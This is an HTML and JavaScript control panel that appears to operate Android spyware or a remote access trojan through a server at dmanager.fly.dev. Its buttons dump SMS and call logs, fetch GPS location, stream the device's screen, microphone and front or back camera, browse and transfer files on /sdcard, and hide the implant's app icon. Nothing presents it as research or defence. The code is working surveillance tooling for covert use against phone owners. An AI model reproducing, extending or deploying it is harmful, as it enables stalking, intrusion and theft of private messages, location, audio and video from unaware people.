<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Console</title>
<style>
  :root { --bg:#121212; --panel:#1E1E1E; --fg:#e0e0e0; --acc:#00E676; --warn:#FF5252; --dim:#888; --line:#333; }
  * { box-sizing: border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size:14px; }
  header { background:var(--panel); padding:12px; position:sticky; top:0; z-index:10; display:flex; flex-direction:column; gap:8px; border-radius: 0 0 16px 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
  .row { display:flex; align-items:center; gap:8px; }
  .input-group { flex:1; display:flex; gap:8px; }
  .input-group input { flex:1; background:#121212; border:1px solid var(--line); color:var(--fg); padding:10px; border-radius:8px; }
  #connectBtn { background:var(--acc); color:#000; border:none; padding:10px 16px; border-radius:8px; font-weight:bold; cursor:pointer; }
  .status-bar { display:flex; align-items:center; gap:6px; font-size:12px; font-weight:bold; color:var(--dim); }
  .dot { width:10px; height:10px; border-radius:50%; background:var(--warn); }
  .dot.on { background:var(--acc); box-shadow:0 0 8px var(--acc); }
  select { background:#121212; color:var(--acc); border:1px solid var(--line); padding:8px; border-radius:8px; max-width:200px; }
  nav { display:flex; padding: 12px 12px 0 12px; gap: 8px; overflow-x:auto; }
  nav button { background:var(--panel); border:none; color:var(--dim); padding:10px 16px; border-radius:10px; font-weight:bold; cursor:pointer; }
  nav button.active { color:#000; background:var(--acc); }
  main { padding:12px; }
  .tab { display:none; } .tab.active { display:block; }
  .card { background:var(--panel); border-radius:16px; padding:16px; margin-bottom:12px; }
  .card h2 { margin:0 0 12px 0; font-size:13px; color:var(--acc); }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
  button.act { background:#2C2C2C; color:var(--fg); border:none; padding:14px; border-radius:12px; font-weight:bold; cursor:pointer; }
  button.act.danger { background:var(--warn); color:#fff; }
  button.act.success { background:var(--acc); color:#000; }
  .screen-container { position:relative; background:#000; border-radius:12px; margin-top:12px; touch-action:none; }
  canvas { width:100%; display:block; }
  pre { background:#121212; padding:12px; border-radius:12px; font-size:12px; color:#aaa; max-height:250px; overflow:auto; }
  .file-list { display:flex; flex-direction:column; gap:8px; margin-top:12px; }
  .file-item { display:flex; justify-content:space-between; padding:14px; background:#2C2C2C; border-radius:12px; cursor:pointer; }
  img#cam-img { width:100%; border-radius:12px; margin-top:12px; display:none; }
</style>
</head>
<body>
<header>
  <div class="row">
    <div class="input-group">
      <input id="server" placeholder="Server URL" value="https://dmanager.fly.dev">
      <input id="psk" type="password" placeholder="PSK">
    </div>
    <button id="connectBtn" onclick="connect()">Connect</button>
  </div>
  <div class="row" style="justify-content:space-between;">
    <div class="status-bar"><div id="led" class="dot"></div><span id="status">Disconnected</span></div>
    <select id="device-select" onchange="onDeviceChange()"><option value="">No Device</option></select>
  </div>
</header>
<nav>
  <button class="active" onclick="switchTab('live', this)">Live</button>
  <button onclick="switchTab('device', this)">Device</button>
  <button onclick="switchTab('camera', this)">Camera</button>
  <button onclick="switchTab('files', this)">Files</button>
</nav>
<main>
  <div id="tab-live" class="tab active">
    <div class="card"><h2>Live Screen</h2>
      <div class="grid" style="margin-bottom:10px;">
        <button class="act success" id="btn-screen" onclick="toggleScreen()">Start Screen</button>
        <button class="act" id="btn-audio" onclick="toggleAudio()">Start Audio</button>
      </div>
      <div class="screen-container" id="screen-container"><canvas id="screen" width="480" height="800"></canvas></div>
    </div>
  </div>
  <div id="tab-device" class="tab">
    <div class="card"><h2>Device Info</h2>
      <div id="telemetry-data"></div>
      <button class="act success" style="width:100%; margin-top:10px;" onclick="refreshTelemetry()">Refresh Info</button>
    </div>
    <div class="card"><h2>Data Extraction</h2>
      <div class="grid">
        <button class="act" onclick="runCmd('get_sms', {limit: 50})">Dump SMS</button>
        <button class="act" onclick="runCmd('get_calllogs', {limit: 50})">Dump Calls</button>
        <button class="act" onclick="runCmd('get_location')">GPS Location</button>
        <button class="act danger" id="btn-hide" onclick="toggleHide()">Hide Icon</button>
      </div>
      <pre id="extract-out">Awaiting command...</pre>
    </div>
  </div>
  <div id="tab-camera" class="tab">
    <div class="card"><h2>Camera Control</h2>
      <div class="grid" style="margin-bottom:10px;">
        <button class="act success" onclick="runCmd('start_camera', {facing: 'front'})">Front Cam</button>
        <button class="act success" onclick="runCmd('start_camera', {facing: 'back'})">Back Cam</button>
      </div>
      <button class="act danger" style="width:100%;" onclick="stopCam()">Stop Camera</button>
      <img id="cam-img">
    </div>
  </div>
  <div id="tab-files" class="tab">
    <div class="card"><h2>File Manager</h2>
      <div class="row">
        <input id="file-path" value="/sdcard" style="flex:1; padding:10px; border-radius:8px; border:1px solid #333; background:#121212; color:white;">
        <button class="act" onclick="listDir()">Go</button>
      </div>
      <div class="file-list" id="file-list"></div>
      <pre id="files-out" style="margin-top:12px;">Awaiting command...</pre>
    </div>
    <div class="card"><h2>Transfer</h2>
      <input id="upload" type="file" style="margin-bottom:10px; width:100%;">
      <div class="grid">
        <button class="act success" onclick="uploadFile()">Upload</button>
        <button class="act" onclick="downloadFile()">Download</button>
      </div>
    </div>
  </div>
</main>
<script>
const $ = id => document.getElementById(id);
let ws = null, currentDevice = "", realW = 1080, realH = 1920, isHidden = false, pingInt = null;

function switchTab(id, btn) {
  document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
  document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
  $(`tab-${id}`).classList.add('active'); btn.classList.add('active');
}
function formatUrl(url) { return url.startsWith('http') ? url.replace(/\/+$/, '') : 'https://' + url.replace(/\/+$/, ''); }
function onDeviceChange() { currentDevice = $('device-select').value; if (currentDevice) refreshTelemetry(); }

async function connect() {
  const psk = $('psk').value.trim(), server = formatUrl($('server').value);
  if (!psk || !server) return alert('Enter server + PSK');
  sessionStorage.setItem('psk', psk); sessionStorage.setItem('server', server);
  $('status').textContent = 'Connecting...';
  openWs(server, psk);
}

function openWs(server, psk) {
  if (ws) ws.close();
  const u = new URL(server); u.protocol = u.protocol === 'https:' ? 'wss:' : 'ws:'; u.pathname = '/ws';
  ws = new WebSocket(u.toString());
  ws.onopen = () => {
    $('led').className = 'dot on'; $('status').textContent = 'Connected'; $('connectBtn').textContent = 'Connected';
    ws.send(JSON.stringify({ role: 'dashboard', psk }));
    pingInt = setInterval(() => { if (ws.readyState === 1) ws.send(JSON.stringify({ type: 'ping' })); }, 10000);
  };
  ws.onmessage = ev => handlePush(JSON.parse(ev.data));
  ws.onclose = () => {
    $('led').className = 'dot'; $('status').textContent = 'Reconnecting...'; $('connectBtn').textContent = 'Reconnect';
    clearInterval(pingInt); setTimeout(() => openWs(server, psk), 3000);
  };
}

function handlePush(msg) {
  if (msg.type === 'device_list') {
    $('device-select').innerHTML = '<option value="">Select Device</option>';
    msg.devices.forEach(d => addDeviceOption(d.id, d.name));
    if (msg.devices.length > 0 && !currentDevice) { $('device-select').value = msg.devices[0].id; onDeviceChange(); }
  } else if (msg.type === 'device_online') addDeviceOption(msg.device_id, msg.device_name);
  else if (msg.type === 'device_offline') {
    const opt = [...$('device-select').options].find(o => o.value === msg.device_id);
    if (opt) opt.remove();
    if (currentDevice === msg.device_id) currentDevice = "";
  } else if (msg.type === 'push') {
    if (msg.kind === 'screen_frame') drawScreen(msg.data);
    else if (msg.kind === 'camera_frame') { $('cam-img').src = 'data:image/jpeg;base64,' + msg.data; $('cam-img').style.display = 'block'; }
    else if (msg.kind === 'audio_chunk') playAudio(msg.data);
  }
}
function addDeviceOption(id, name) {
  if ([...$('device-select').options].some(o => o.value === id)) return;
  const opt = document.createElement('option'); opt.value = id; opt.textContent = `${name} (${id.substring(0,6)}...)`;
  $('device-select').appendChild(opt);
  if (!currentDevice) { $('device-select').value = id; onDeviceChange(); }
}

function drawScreen(b64) {
  const cv = $('screen'), ctx = cv.getContext('2d'), img = new Image();
  img.onload = () => { if (cv.width !== img.width) { cv.width = img.width; cv.height = img.height; } ctx.drawImage(img, 0, 0); };
  img.src = 'data:image/jpeg;base64,' + b64;
}
let actx, atime = 0;
function playAudio(b64) {
  if (!actx) { actx = new AudioContext({ sampleRate: 16000 }); atime = actx.currentTime; }
  if (actx.state === 'suspended') actx.resume();
  const pcm = new Int16Array(Uint8Array.from(atob(b64), c => c.charCodeAt(0)).buffer);
  const buf = actx.createBuffer(1, pcm.length, 16000); const ch = buf.getChannelData(0);
  for (let i = 0; i < pcm.length; i++) ch[i] = pcm[i] / 32768;
  const src = actx.createBufferSource(); src.buffer = buf; src.connect(actx.destination);
  if (atime < actx.currentTime) atime = actx.currentTime; src.start(atime); atime += buf.duration;
}

async function api(cmd, args = {}) {
  if (!currentDevice) throw new Error("No device selected");
  const r = await fetch(formatUrl($('server').value) + '/api/cmd', {
    method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + $('psk').value },
    body: JSON.stringify({ device_id: currentDevice, cmd, args }),
  });
  if (!r.ok) throw new Error('Server error ' + r.status);
  return await r.json();
}

async function refreshTelemetry() { try { const r = await api('get_device_info'); if (r.ok) { $('telemetry-data').innerHTML = Object.entries(r.data).map(([k,v]) => `<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #333;"><span>${k}</span><b>${v}</b></div>`).join(''); if(r.data.screen_w) realW=r.data.screen_w, realH=r.data.screen_h; } } catch (e) { alert(e.message); } }
async function runCmd(cmd, args = {}) { try { const r = await api(cmd, args); $('extract-out').textContent = JSON.stringify(r.data || r.error, null, 2); } catch (e) { alert(e.message); } }
async function toggleHide() { try { await api(isHidden ? 'unhide_icon' : 'hide_icon'); isHidden = !isHidden; $('btn-hide').textContent = isHidden ? 'Unhide Icon' : 'Hide Icon'; } catch (e) { alert(e.message); } }

let sOn = false, aOn = false;
async function toggleScreen() { try { if (!sOn) { await api('start_screen'); sOn = true; $('btn-screen').textContent = 'Stop Screen'; $('btn-screen').classList.add('danger'); } else { await api('stop_screen'); sOn = false; $('btn-screen').textContent = 'Start Screen'; $('btn-screen').classList.remove('danger'); } } catch (e) { alert(e.message); } }
async function toggleAudio() { try { if (!aOn) { await api('start_audio'); aOn = true; $('btn-audio').textContent = 'Stop Audio'; $('btn-audio').classList.add('danger'); } else { await api('stop_audio'); aOn = false; $('btn-audio').textContent = 'Start Audio'; $('btn-audio').classList.remove('danger'); } } catch (e) { alert(e.message); } }
async function stopCam() { try { await api('stop_camera'); $('cam-img').style.display = 'none'; } catch (e) { alert(e.message); } }

async function listDir() {
  try {
    const r = await api('list_dir', { path: $('file-path').value }); $('file-list').innerHTML = '';
    if (r.ok) r.data.entries.forEach(f => {
      const d = document.createElement('div'); d.className = 'file-item';
      d.innerHTML = `<span>${f.dir ? '📁' : '📄'} ${f.name}</span><span>${f.dir ? '' : (f.size/1024).toFixed(1)+' KB'}</span>`;
      d.onclick = () => { $('file-path').value = f.path; if (f.dir) listDir(); }; $('file-list').appendChild(d);
    });
  } catch (e) { alert(e.message); }
}
async function downloadFile() {
  try { const r = await api('download_file', { path: $('file-path').value }); if (r.ok) { const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([Uint8Array.from(atob(r.data.b64), c => c.charCodeAt(0))])); a.download = $('file-path').value.split('/').pop(); a.click(); } } catch (e) { alert(e.message); }
}
async function uploadFile() {
  const f = $('upload').files[0]; if (!f) return; const reader = new FileReader();
  reader.onload = async () => { try { await api('upload_file', { path: $('file-path').value + '/' + f.name, data: reader.result.split(',')[1] }); listDir(); } catch (e) { alert(e.message); } };
  reader.readAsDataURL(f);
}

$('server').value = sessionStorage.getItem('server') || 'https://dmanager.fly.dev';
$('psk').value = sessionStorage.getItem('psk') || '';
</script>
</body>
</html>
